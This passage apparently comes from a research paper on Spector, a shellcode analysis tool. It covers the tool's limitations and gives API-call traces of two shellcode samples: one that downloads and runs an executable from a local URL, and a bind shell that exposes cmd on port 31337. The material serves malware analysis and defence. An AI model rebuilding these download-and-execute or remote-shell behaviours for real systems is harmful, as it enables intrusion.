### Configuration and Limitations of Spector

Spector does not receive real data over the network, and as a result, it will raise an exception if shell code attempts to download and execute additional instructions in an inline buffer. However, our promising performance results suggest that it may be feasible to run Spector in real-time, allowing it to make actual network calls, which would eliminate this limitation.

Another limitation of Spector is its speed relative to an actual processor. If authors intentionally insert tight loops that execute a large number of instructions within the shell code, Spector may take an unreasonably long time to analyze the code. In contrast, a modern processor could execute the same code in less than a second. An example of such code is a simple loop: 

```shell
While i < 1000000:
    # Perform some operation
```

### Example Shell Code Analysis

#### HttpExec1
- `OpenMutexA(0x1F0001, 1, "u1")`
- `VirtualAlloc(0, 0x50000, 0x1000, 4)`: Allocates memory.
- `CreateFileA(".\\ftpupd.exe", 0x40000000, 0, 0, 2, 0, 0)`: Creates or opens a file.
- `InternetOpenA("Mozilla/4.0", 1, "NULL", "NULL", 0)`: Initializes an Internet session.
- `InternetOpenUrlA(hInternet, "http://127.0.0.1:31337/x.exe", "NULL", 0, 0, 0)`: Opens a URL.
- `InternetReadFile(hUrl, hHeapMemory0, 0x50000, SESP + 0xFFFFFFFC)`: Reads data from the URL.
- `WriteFile(hFile, hHeapMemory0, urlFileSize, SESP + 0xFFFFFFFC, 0)`: Writes data to the file.
- `CloseHandle(hFile)`: Closes the file handle.
- `WinExec(".\\ftpupd.exe", 5)`: Executes the file.
- `ExitThread(0)`: Exits the thread.

#### BindShell1
- `WSASocketA(2, 1, 0, 0, 0, 0)`: Creates a socket.
- `bind(newsocket, sockaddr('0.0.0.0', 31337, 2), 0x10)`: Binds the socket to a local address.
- `listen(newsocket, 1)`: Listens for incoming connections.
- `accept(newsocket, 0, 0)`: Accepts an incoming connection.
- `CreateProcessA(NULL, "cmd", 0, 0, 1, 0, 0, NULL, {LPSTARTUPINFO: hStdInput=acceptsocket, hStdOutput=acceptsocket}, code + 0x1FD)`: Creates a new process.
- `closesocket(acceptsocket)`: Closes the accepted socket.
- `closesocket(newsocket)`: Closes the listening socket.
- `ExitThread(0)`: Exits the thread.
